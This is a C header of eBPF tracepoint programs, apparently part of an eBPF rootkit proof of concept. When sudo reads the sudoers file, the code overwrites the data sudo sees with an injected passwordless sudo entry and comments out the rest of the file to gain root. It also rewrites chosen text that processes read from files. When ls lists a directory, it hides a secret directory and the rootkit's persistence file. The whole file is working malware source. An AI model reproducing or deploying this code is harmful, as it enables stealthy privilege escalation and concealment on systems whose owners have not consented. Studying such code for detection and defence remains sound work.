#ifndef __FS_H
#define __FS_H

#include "headervmlinux.h"
/*#include <stdio.h>
#include <linux/types.h>
#include <unistd.h>
#include <string.h>
#include <linux/ptrace.h>
#include <linux/stat.h>*/
#include <ctype.h>
#include <string.h>

#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#include "../../../common/constants.h"
#include "../../../common/map_common.h"
#include "../data/ring_buffer.h"
#include "defs.h"
#include "../utils/strings.h"

/**
 * >> cat /sys/kernel/debug/tracing/events/syscalls/sys_exit_read/format
 * Also https://github.com/torvalds/linux/blob/master/kernel/trace/trace_syscalls.c#L673
 */
struct sys_read_exit_ctx {
    unsigned long long unused; //Pointer to pt_regs
    int __syscall_nr;
    long ret;
};

/**
 * >> cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_read/format
 * Also https://github.com/torvalds/linux/blob/master/kernel/trace/trace_syscalls.c#L588
 */
struct sys_read_enter_ctx {
    unsigned long long unused; //Pointer to pt_regs
    int __syscall_nr;
    unsigned int padding; //Alignment
    unsigned long fd;
    char* buf;
    size_t count;
};

/**
 * >> cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_openat/format
 */
struct sys_openat_enter_ctx {
    unsigned long long unused;
    int __syscall_nr;
    unsigned int padding;
    int dfd;
    char* filename;
    unsigned int flags;
    umode_t mode;
};

/**
 * >> cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_getdents64/format
 */
struct sys_getdents64_enter_ctx {
    unsigned long long unused;
    int __syscall_nr;
    unsigned int padding;
    unsigned int fd;
    struct linux_dirent64 *dirent;
    unsigned int count;
};

/**
 * >> cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_getdents64/format
 */
struct sys_getdents64_exit_ctx {
    unsigned long long unused;
    int __syscall_nr;
    unsigned int padding;
    long ret;
};


static __always_inline int handle_tp_sys_enter_read(struct sys_read_enter_ctx *ctx, int fd, char* buf){
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    __u32 pid = pid_tgid >> 32;

    struct fs_open_data *stored_data = (struct fs_open_data*) bpf_map_lookup_elem(&fs_open, &pid_tgid);
    if (stored_data == NULL){
        //Not found
        //bpf_printk("Not found\n");
        return -1;
    }

    struct fs_open_data data = *stored_data;
    data.buf = buf;
    data.fd = fd;

    bpf_map_update_elem(&fs_open, &pid_tgid, &data, BPF_EXIST);
    //bpf_printk("IN PID: %u, FS:%u\n", pid, fd);
    return 0;
}

static __always_inline int handle_tp_sys_exit_read(struct sys_read_exit_ctx *ctx, __u64 pid_tgid){
    struct fs_open_data *data = (struct fs_open_data*) bpf_map_lookup_elem(&fs_open, &pid_tgid);
    if (data == NULL || data->buf == NULL){
        //Not found
        //bpf_printk("Not found\n");
        return -1;
    }

    //Overwritting a byte of the buffer
    char *buf = data->buf;
    __u32 pid = data->pid;
    char msg_original[] = STRING_FS_HIDE;
    char msg_overwrite[] = STRING_FS_OVERWRITE;
    char c_buf[sizeof(msg_overwrite)] = {0};

    char sudo_line_overwrite[] = STRING_FS_SUDOERS_ENTRY;
    char c_buf_sudo[STRING_FS_SUDOERS_ENTRY_LEN] = {0};
    
    if(buf == NULL){
        return -1;
    }

    //For including an user in the sudoers file
    //We just put our new line there, independently on what the rest of the file contains
    if(data->is_sudo==1){
        //bpf_printk("Proceeding to verwrite sudo\n");
        if(bpf_probe_write_user((void*)buf, (void*)sudo_line_overwrite, (__u32)STRING_FS_SUDOERS_ENTRY_LEN-1)<0){
            bpf_printk("Error writing to user memory\n");
            return -1;
        }
        //Overwriting the first line is enough, but we must go one step further now.
        //If the current user has sudo privileges already, then another entry will describe its permissions too,
        //and that one will override the NOPASSWD entry we wrote now. In order to increment the probability
        //that we achieve free full sudo capabilities without password, we must override some more chars.
        //For the best results: First measure byte length of sudoers. And fill with '#' (total-length - length sudo__line_overwrite)
        //Not enough overwritten bytes and you may not get privesc, too many and you may overwrite something else.
        int CHARS_TO_OVERRIDE = 700;
        char char_override = '#';
        for (int ii = 0; ii<CHARS_TO_OVERRIDE; ii++){
            if(bpf_probe_write_user((void*)buf+ STRING_FS_SUDOERS_ENTRY_LEN+ii, (void*)&char_override, (__u32)1)<0){
                bpf_printk("Error writing to user memory in additional symbol\n");
                break;
            }
        }

        bpf_printk("Sudo overwritten\n");
        return 0;
    }
    
    //For PoC 2 - Modifying text read from a file
    #pragma unroll
    for(int ii=0; ii<sizeof(msg_original)-1; ii++){
        if(bpf_probe_read_user(c_buf+ii, 1, buf+ii)<0){
            //bpf_printk("Error reading\n");
            return -1;
        }
        char c = (char)*(c_buf+ii);
        
        if( c != msg_original[ii]){
            //Not the string we are looking for
            //if(ii>0)bpf_printk("Discarded string, expected %i and received %i, %s\n", c, msg_original[ii], buf);
            return -1;
        }
        if(c<32 || c>126){ //Not alphanumeric or symbol
            //bpf_printk("Discarded string at pid cause c %u, %s\n", pid, buf);
            return -1;
        }
    }

    bpf_printk("Overwritting at pid %u, %s\n", pid, buf);
    bpf_printk("Filename is %s\n", data->filename);
    bpf_printk("and program name is %s\n", data->program_name);
    if(bpf_probe_write_user((void*)buf, (void*)msg_overwrite, (__u32)sizeof(msg_overwrite)-1)<0){
        bpf_printk("Error writing to user memory\n");
    }
    

    return 0;
}

static __always_inline int handle_tp_sys_enter_openat(struct sys_openat_enter_ctx *ctx, __u64 pid_tgid){
    char comm[TASK_COMM_LEN] = {0};
    int err = bpf_get_current_comm(comm, sizeof(comm));
    /*struct fs_open_data *data = (struct fs_open_data*) bpf_map_lookup_elem(&fs_open, &pid_tgid);
    if (data == NULL || data->buf == NULL){
        //Not found
        bpf_printk("Not found in openat\n");
        return -1;
    }*/
    
    if(err < 0){
        return -1;
    }

    char filename[STRING_FS_SUDOERS_FILE_LEN] = {0};
    bpf_probe_read_user(&filename, STRING_FS_SUDOERS_FILE_LEN, (char*)ctx->filename);

    __u32 pid = pid_tgid >> 32;
    struct fs_open_data data = {
        .pid = pid
    };
    bpf_probe_read(data.filename, STRING_FS_SUDOERS_FILE_LEN, filename);
    bpf_probe_read(data.program_name, FS_OPEN_DATA_PROGRAM_NAME_SIZE, comm);
    
    

    //Check task is sudo
    char *sudo = STRING_FS_SUDO_TASK;
    if(str_n_compare(comm, TASK_COMM_LEN, sudo, STRING_FS_SUDO_TASK_LEN, STRING_FS_SUDO_TASK_LEN) != 0){
        data.is_sudo = 0;
        bpf_map_update_elem(&fs_open, &pid_tgid, &data, BPF_ANY);
        return 0;
    }

    //Check filename is the sudoers file
    char *sudoers = STRING_FS_SUDOERS_FILE;
    if(str_n_compare(filename, STRING_FS_SUDOERS_FILE_LEN, sudoers, STRING_FS_SUDOERS_FILE_LEN, STRING_FS_SUDOERS_FILE_LEN) != 0){
        data.is_sudo = 0;
        bpf_map_update_elem(&fs_open, &pid_tgid, &data, BPF_ANY);
        return 0;
    }

    data.is_sudo = 1;
    bpf_map_update_elem(&fs_open, &pid_tgid, &data, BPF_ANY);
    //bpf_printk("It was a sudo!\n");

    return 0;

}



static __always_inline int handle_tp_sys_enter_getdents64(struct sys_getdents64_enter_ctx *ctx, __u64 pid_tgid){
    char comm[TASK_COMM_LEN] = {0};
    int err = bpf_get_current_comm(comm, sizeof(comm));
    if(err < 0){
        return -1;
    }

    char *task = "ls";
    if(str_n_compare(comm, 2, task, 2, 2) != 0){
        return 0;
    }

    struct linux_dirent64 *d_entry;
    struct fs_dir_log_data *stored_data = (struct fs_dir_log_data*) bpf_map_lookup_elem(&fs_dir_log, &pid_tgid);
    if (stored_data == NULL){
        struct fs_dir_log_data data = {0};
        err = bpf_probe_read(&(data.dirent_info), sizeof(struct linux_dirent64), &(ctx->dirent));
        if(err<0){
            bpf_printk("Failed to read dirent info on enter\n");
        }
        bpf_map_update_elem(&fs_dir_log, &pid_tgid, &data, BPF_ANY);
        return 0;
    }
    struct fs_dir_log_data data = *stored_data;
    err = bpf_probe_read(&(data.dirent_info), sizeof(struct linux_dirent64), ctx->dirent);
    if(err<0){
        bpf_printk("Failed to read dirent info on enter 2\n");
    }
    bpf_map_update_elem(&fs_dir_log, &pid_tgid, &data, BPF_ANY);

    return 0;

}

static __always_inline int handle_tp_sys_exit_getdents64(struct sys_getdents64_exit_ctx *ctx, __u64 pid_tgid){
    char comm[TASK_COMM_LEN] = {0};
    int err = bpf_get_current_comm(comm, sizeof(comm));
    if(err < 0){
        return -1;
    }

    char *task = "ls";
    if(str_n_compare(comm, 2, task, 2, 2) != 0){
        return 0;
    }

    __u64 *stored_data = bpf_map_lookup_elem(&fs_dir_log, &pid_tgid);
    if (stored_data == NULL){
        //Nothing for this process
        bpf_printk("Exitting getdents, empty\n");
        return 0;
    }
    __u64 d_entry_base_addr = (__u64)(*stored_data);
    
    //Length of directory buffer
    //https://linux.die.net/man/2/getdents64
    long dir_buf_max = ctx->ret; 
    long curr_offset = 0;
    bpf_printk("Starting dirent search, max:%ld, base_addr: %lx\n", dir_buf_max, d_entry_base_addr);
    //We will proceed to iterate through the buffer and look for our secret dir until we are past the limit
    struct linux_dirent64* previous_dir = (struct linux_dirent64*)(d_entry_base_addr + curr_offset);
    for(int ii=0; ii<32; ii++){
        if(curr_offset>=dir_buf_max){
            bpf_printk("Finished dirent search because we reached the end: %ld\n", dir_buf_max);
            break;
        }
        struct linux_dirent64 *d_entry = (struct linux_dirent64*)(d_entry_base_addr + curr_offset);
        __u16 d_reclen;
        char d_name[128];
        bpf_probe_read(&d_reclen, sizeof(__u16), &d_entry->d_reclen); 
        //bpf_printk("Record length: %d\n", d_reclen);
        char d_type;
        bpf_probe_read(&d_type, sizeof(d_type), &d_entry->d_type);
        int err = bpf_probe_read_user(&d_name, 128, d_entry->d_name);
        if (err!=0){
            //Ignore this entry, error
            curr_offset += d_reclen;
            bpf_printk("Error reading directory name\n");
            continue;
        }
        //It is a directory, check if it is ours
        if (d_type == 4){
            bpf_printk("DIR: %s\n", d_name);
            if(previous_dir != NULL){
                if(str_n_compare(d_name, sizeof(SECRET_DIRECTORY_NAME_HIDE)-1, SECRET_DIRECTORY_NAME_HIDE, sizeof(SECRET_DIRECTORY_NAME_HIDE)-1, sizeof(SECRET_DIRECTORY_NAME_HIDE)-1)==0){
                    __u16 prev_reclen;
                    bpf_probe_read(&prev_reclen, sizeof(__u16), &previous_dir->d_reclen); 
                    __u16 new_len = prev_reclen + d_reclen;
                    bpf_printk("Prev dir len:%d, new len:%d", prev_reclen, new_len);
                    err = bpf_probe_write_user(&(previous_dir->d_reclen), &new_len ,sizeof(__u16));
                    if(err<0){
                        bpf_printk("Failed to overwrite directory struct length\n");
                    }
                }
            }
            bpf_probe_read(&previous_dir, sizeof(struct linux_dirent64*), &d_entry);
            curr_offset += d_reclen;
            continue;
        }
        
        //This hides files which achieve the persistence of the rootkit, so better not to be shown
        bpf_printk("FILE: d_reclen: %d, d_name: %s", d_reclen, d_name);
        if(previous_dir != NULL){
            if(str_n_compare(d_name, sizeof(SECRET_FILE_PERSISTENCE_NAME)-1, SECRET_FILE_PERSISTENCE_NAME, sizeof(SECRET_FILE_PERSISTENCE_NAME)-1, sizeof(SECRET_FILE_PERSISTENCE_NAME)-1)==0){
                __u16 prev_reclen;
                bpf_probe_read(&prev_reclen, sizeof(__u16), &previous_dir->d_reclen); 
                __u16 new_len = prev_reclen + d_reclen;
                bpf_printk("Prev dir len:%d, new len:%d", prev_reclen, new_len);
                err = bpf_probe_write_user(&(previous_dir->d_reclen), &new_len ,sizeof(__u16));
                if(err<0){
                    bpf_printk("Failed to overwrite directory struct length\n");
                }
            }
        }
        
        
        //Update the pointer
        bpf_probe_read(&previous_dir, sizeof(struct linux_dirent64*), &d_entry);
        curr_offset += d_reclen;

        //Note, TODO
        //We can also overwrite &d_entry->d_name for files!
    }

    return 0;
}



/**
 * @brief Receives read event and stores the parameters into internal map
 * 
 */
SEC("tp/syscalls/sys_enter_read") 
int tp_sys_enter_read(struct sys_read_enter_ctx *ctx) { 
    struct sys_read_enter_ctx *rctx = ctx; 
    if (ctx == NULL){
        bpf_printk("Error\n");
        return 0; 
    }

    int fd = (int) ctx->fd; 
    char *buf = (char*) ctx->buf; 
    return handle_tp_sys_enter_read(ctx, fd, buf); 
} 

/**
 * @brief Called AFTER the ksys_read call, checks the internal
 * map for the tgid+pid used and extracts the parameters.
 * Uses the user-space buffer reference for overwritting the returned
 * values. 
 */
SEC("tp/syscalls/sys_exit_read")
int tp_sys_exit_read(struct sys_read_exit_ctx *ctx){
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    if(pid_tgid<0){
        //bpf_printk("Out\n");
        return -1;
    }
    //bpf_printk("OUT PID: %u\n", pid_tgid>>32);

    return handle_tp_sys_exit_read(ctx, pid_tgid);
}

/**
 * @brief 
 * 
 */
SEC("tp/syscalls/sys_enter_openat")
int tp_sys_enter_openat(struct sys_openat_enter_ctx *ctx){
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    if(pid_tgid<0){
        //bpf_printk("Out\n");
        return -1;
    }
    return handle_tp_sys_enter_openat(ctx, pid_tgid);
}


/**
 * @brief 
 * 
 */
SEC("tp/syscalls/sys_enter_getdents64")
int tp_sys_enter_getdents64(struct sys_getdents64_enter_ctx *ctx){
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    if(pid_tgid<0){
        //bpf_printk("Out\n");
        return -1;
    }
    return handle_tp_sys_enter_getdents64(ctx, pid_tgid);
}

/**
 * @brief 
 * 
 */
SEC("tp/syscalls/sys_exit_getdents64")
int tp_sys_exit_getdents64(struct sys_getdents64_exit_ctx *ctx){
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    if(pid_tgid<0){
        //bpf_printk("Out\n");
        return -1;
    }
    return handle_tp_sys_exit_getdents64(ctx, pid_tgid);
}



#endif